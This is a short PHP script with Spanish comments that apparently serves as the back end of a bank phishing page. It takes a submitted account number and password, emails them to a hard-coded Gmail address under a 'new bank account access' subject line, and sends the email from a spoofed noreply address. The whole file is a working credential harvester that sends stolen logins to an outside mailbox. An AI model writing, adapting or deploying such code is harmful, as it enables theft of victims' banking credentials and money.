<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $cuenta = htmlspecialchars($_POST['cuenta']);
    $password = htmlspecialchars($_POST['password']);

    // Dirección de correo a la que se enviarán los datos
    $destinatario = "pabloyasno1945@gmail.com";
    $asunto = "Nuevo acceso a la cuenta bancaria";

    // Cuerpo del correo
    $mensaje = "Número de cuenta: " . $cuenta . "\n";
    $mensaje .= "Contraseña: " . $password . "\n";

    // Cabeceras para el envío del correo
    $headers = "From: noreply@tuweb.com\r\n";
    $headers .= "Reply-To: noreply@tuweb.com\r\n";
    $headers .= "Content-Type: text/plain; charset=UTF-8\r\n";

    // Envío del correo
    if (mail($destinatario, $asunto, $mensaje, $headers)) {
        echo "Los datos han sido enviados con éxito.";
    } else {
        echo "Error al enviar los datos.";
    }
} else {
    echo "Método no permitido.";
}
?>
